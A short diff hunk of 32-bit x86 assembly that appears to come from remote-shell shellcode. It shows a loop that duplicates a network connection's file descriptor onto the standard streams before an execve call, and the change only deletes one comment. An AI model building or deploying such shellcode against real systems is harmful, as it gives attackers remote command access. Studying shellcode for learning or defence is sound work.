@@ -78,7 +78,7 @@ _dup_loop:
 	mov ebx, esi		; ebx = connection_fd
 	dec cl			; decrease ecx to get actual FD
 	int 0x80
-	jnz _dup_loop		; loop until ecx becomes -1 (sign flag)
+	jnz _dup_loop
 
 
 	;// Invoking EXECVE
